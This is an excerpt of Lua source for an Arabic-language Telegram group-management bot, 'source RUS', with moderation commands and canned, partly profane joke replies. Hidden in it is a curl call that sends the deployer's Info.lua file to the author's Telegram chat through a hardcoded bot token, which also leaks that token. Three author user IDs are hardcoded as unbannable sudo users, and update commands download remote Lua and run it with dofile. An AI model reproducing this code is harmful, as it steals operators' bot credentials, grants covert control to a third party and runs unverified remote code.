...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/Java-ak/Rus/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1148118203,1614314857,1811135701,}   
...
if tonumber(user_id) == tonumber(1148118203) then  
var = true 
elseif tonumber(user_id) == tonumber(1614314857) then
var = true  
elseif tonumber(user_id) == tonumber(1811135701) then
var = true 
...
elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
var = database:get(bot_id.."CoSu:Rd"..msg.chat_id_) or 'روز'
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼 𝘀𝗼𝘂𝗿𝗰𝗲 𝗿𝘂𝘀")  
...
local curl = 'curl "'..'https://api.telegram.org/bot1833028811:AAFhC73CuTwejU9QMzADwW7AAojzK0EQOII/sendDocument'..'" -F "chat_id='.. 1148118203 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
--------------------------------------------------------------------------------------------------------------
...
os.execute('wget https://raw.githubusercontent.com/Java-ak/Rus/main/DRAGON.lua')
send(msg.chat_id_, msg.id_,'𖤐 تم تحديث السورس')
dofile('DRAGON.lua')  
end
if text == 'الاصدار ' and DevSoFi(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' 𖤐 اصدار سورس روز { s: 6.7}')
end
...
{{text = '𝘀𝗼𝘂𝗿𝗰𝗲 𝗿𝘂𝘀️️', url="t.me/sourse_RUS"}}, 
} 
...
send(msg.chat_id_,0," 𖤐 العضو : {["..data.first_name_.."](T.ME/sourse_RUS)}\n 𖤐 ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " 𖤐 عذرا ⇐ {["..data.first_name_.."](T.ME/sourse_RUS)}\n 𖤐 عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'مطور السورس⚙',url="t.me/AliBasha5"}},
{{text = 'مطور السورس⚙',url="t.me/mlll_22"}},
{{text = '𝘀𝗼𝘂𝗿𝗰𝗲 𝗿𝘂𝘀 🧭 ', url="t.me/sourse_RUS"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
local Text = [[
 🔆 اهلا بك في سورس روز الجمدان لو عايز بوت بأسعار منسبه وبوت مميز كلمني  🔆 
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝘥𝘦𝘷 𝘬ꪮ𝘳𝘴ꪖꪀ ➪ ',url="t.me/mlll_22"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
if text == 'العاب روز' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
 اهلا في قائمه الالعاب المتطوره سورس روز🚌
...
elseif text == 'قفل روزرسيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
...
elseif text == 'فتح روزرسيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
...
if tonumber(result.sender_user_id_) == tonumber(1148118203) then  
...
if tonumber(result.sender_user_id_) == tonumber(1811135701) then  
send(msg.chat_id_, msg.id_, " 𖤐 لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if result.id_ == tonumber(1148118203) then
...
if result.id_ == tonumber(1811135701) then
send(msg.chat_id_, msg.id_, " 𖤐 لا يمكنك حظر مبرمج السورس \n")
return false 
end
...
if tonumber(userid) == tonumber(1148118203) then  
send(msg.chat_id_, msg.id_, " 𖤐 لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if tonumber(userid) == tonumber(1811135701) then  
send(msg.chat_id_, msg.id_, " 𖤐 لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/Java-ak/Rus/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n 𖤐 اهلا بك في متجر ملفات روز\n 𖤐 ملفات السورس ↓\n≪━━━━━━𝐑𝐔𝐒━━━━━━≫\n\n"
local TextE = "\n≪━━━━━━𝐑𝐔𝐒━━━━━━≫\n 𖤐 علامة تعني { ✔️ } ملف مفعل\n 𖤐 علامة تعني { ✖ } ملف معطل\n 𖤐 قناة سورس روز ↓\n".." 𖤐 [اضغط هنا لدخول](t.me/sourse_RUS) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/Java-ak/Rus/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('DRAGON.lua')  
else
send(msg.chat_id_, msg.id_," 𖤐 عذرا الملف لايدعم سورس روز \n") 
end
return false
end
...
if text == ("مسح قائمه روز") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n 𖤐 تم مسح قائمه روز')
return false
end

if text == 'قائمه روز' and Sudo(msg) then
...
if text == ("رفع روز") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع روز @(.*)$") and Sudo(msg) then
local username = text:match("^رفع روز @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع روز (%d+)$") and Sudo(msg) then
local userid = text:match("^رفع روز (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("تنزيل روز") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل روز @(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل روز @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل روز (%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل روز (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'روز').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'روز')
local DRAGON_Msg = {
'ننعم يروحي 😻💙',
'نعم يا قلب  '..Namebot..'',
'عاوز اي من '..Namebot..'',
...
end --الكود حصري سورس روز يعني لو بكتهن راح اعرفك انت الاخذتهن
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'روز').." غادر" or text == 'غادر' then  
...
send(msg.chat_id_,msg.id_, '[انت مطوري نور عنيا🥺🤍](t.me/sourse_RUS)') 
return false
end

if text == 'انا مين' and DevSoFi(msg) then 
send(msg.chat_id_,msg.id_, '[انت مطوري الثاني حته مني 😍💚](t.me/sourse_RUS)') 
return false
end

if text == 'انا مين' and Sudo(msg) then 
send(msg.chat_id_,msg.id_, '[انت المطور بس الصغنن 🌝💘](t.me/sourse_RUS)') 
return false
end

if text == 'انا مين' and CoSu(msg) then 
send(msg.chat_id_,msg.id_, '[نت المالك هن يعني حاجه فوق فوف راسي 😂♥](t.me/sourse_RUS)') 
return false
end

if text == 'انا مين' and Constructor(msg) then 
send(msg.chat_id_,msg.id_, '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه😹🤦‍♂️](t.me/sourse_RUS)') 
return false
end

if text == 'انا مين' and BasicConstructor(msg) then 
send(msg.chat_id_,msg.id_, '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🚨](t.me/sourse_RUS)') 
return false
end

if text == 'انا مين' and Manager(msg) then 
send(msg.chat_id_,msg.id_, '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/sourse_RUS)') 
return false
end

if text == 'انا مين' and Mod(msg) then 
send(msg.chat_id_,msg.id_, '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/sourse_RUS)') 
return false
end

if text == 'انا مين' and Special(msg) then 
send(msg.chat_id_,msg.id_, '[ انت مميز ابن ناس 😊 ](t.me/sourse_RUS)') 
return false
end

if text == 'انا مين' then
send(msg.chat_id_,msg.id_, '[انت مجرد عضو زليل حقير ملوش لزمه 😂](t.me/sourse_RUS)') 
return false
end
...
if text == 'سلام' then 
send(msg.chat_id_,msg.id_, '[ابق تعاله كليوم..😹💔🎶](t.me/sourse_RUS)') 
return false
end

if text == 'هاي' or text == 'هيي' then
send(msg.chat_id_,msg.id_, '[علي الواي فاي..😺💜](t.me/sourse_RUS)') 
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم برايفت والنبي..🥺💜](t.me/sourse_RUS)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[عليه الصلاه والسلام..💛🙂](t.me/sourse_RUS)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[نزل عينك عيب كده..🌚♥️](t.me/sourse_RUS)') 
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[يحلات عيونك..♥️🦋](t.me/sourse_RUS)')
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[عايز من ده..💋🥀](t.me/sourse_RUS)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[بيحسدوني لما بضحك 😂😂🔥](t.me/sourse_RUS)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم بف..🙄💔](t.me/sourse_RUS)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[حشروو في الانتريه 😂🔥](t.me/sourse_RUS)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[ناموو واللهي 😂🔥 ](t.me/sourse_RUS)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[انا كمان حبق قوي 🌚💘](t.me/sourse_RUS)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[بوس براحه يعم 😂😪](t.me/sourse_RUS)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[فرح خالتك قريب 😂](t.me/sourse_RUS)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[انته مال امك 😂🔥](t.me/sourse_RUS)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[غور بوشك ده علي اساس اني بحبك يعني 😒😹](t.me/sourse_RUS)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[تع شم بصل 🧅😪](t.me/sourse_RUS)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[احا ليك يخول 😎](t.me/sourse_RUS)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[كسمين امك 😂🔥](t.me/sourse_RUS)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[ افسح التنين 😂😉 ](t.me/sourse_RUS)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[بطل حكك بقي 😂🔥](t.me/sourse_RUS)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[في اي 😉💚](t.me/sourse_RUS)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[هو الخول كان مفكرني انسان 😹😹😪](t.me/sourse_RUS)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[متزعلش بحبك..😥♥️](t.me/sourse_RUS)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم بيف ..🙄💔](t.me/sourse_RUS)')
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[وعليكم السلام ..🖤🌚](t.me/sourse_RUS)') 
return false
end
end
end
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'روز')
